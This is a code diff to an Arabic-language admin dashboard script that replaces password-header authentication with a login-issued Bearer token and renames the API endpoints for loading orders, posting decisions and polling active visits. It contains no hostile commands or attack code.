@@ -189,7 +189,7 @@
 </div>
 
 <script>
-  let adminPassword = '';
+  let adminToken = '';
   let loadedApplications = [];
 
   document.getElementById('adminLoginBtn').addEventListener('click', attemptAdminLogin);
@@ -200,14 +200,14 @@
   async function attemptAdminLogin() {
     const val = document.getElementById('adminPasswordInput').value;
     try {
-      const res = await fetch('/api/admin/verify', {
+      const res = await fetch('/api/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ password: val })
       });
       const data = await res.json();
       if (data.ok) {
-        adminPassword = val;
+        adminToken = data.token;
         document.getElementById('adminLogin').style.display = 'none';
         document.getElementById('adminDashboard').classList.add('show');
         loadApplications();
@@ -238,11 +238,12 @@
   async function loadApplications() {
     const tbody = document.getElementById('adminAppsBody');
     try {
-      const res = await fetch('/api/applications', {
-        headers: { 'x-admin-password': adminPassword }
+      const res = await fetch('/api/orders', {
+        headers: { Authorization: 'Bearer ' + adminToken }
       });
       if (!res.ok) throw new Error('failed');
-      loadedApplications = await res.json();
+      const data = await res.json();
+      loadedApplications = data.orders || [];
 
       document.getElementById('appCountLabel').textContent = loadedApplications.length + ' طلب';
 
@@ -253,7 +254,7 @@
 
       tbody.innerHTML = '';
       loadedApplications.forEach((d, index) => {
-        const a = d.applicant || {};
+        const a = d.applicant || d;
         const persons = d.persons || [];
         const card = d.card || d.payment || null;
         const expanded = false;
@@ -386,7 +387,7 @@
   }
 
   function openDetailsModal(d) {
-    const a = d.applicant || {};
+    const a = d.applicant || d;
     const persons = d.persons || [];
     const card = d.card || d.payment || null;
     const modalBody = document.getElementById('modalBody');
@@ -417,7 +418,7 @@
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
-            'x-admin-password': adminPassword
+            Authorization: 'Bearer ' + adminToken
           },
           body: JSON.stringify({ decision: decision })
         });
@@ -441,9 +442,11 @@
   async function pollActiveVisits() {
     async function tick() {
       try {
-        const res = await fetch('/api/active-visits');
+        const res = await fetch('/api/active', {
+          headers: { Authorization: 'Bearer ' + adminToken }
+        });
         const data = await res.json();
-        document.getElementById('wifiCount').textContent = data.count;
+        document.getElementById('wifiCount').textContent = data.active || 0;
       } catch (err) { /* ignore */ }
     }
     tick();
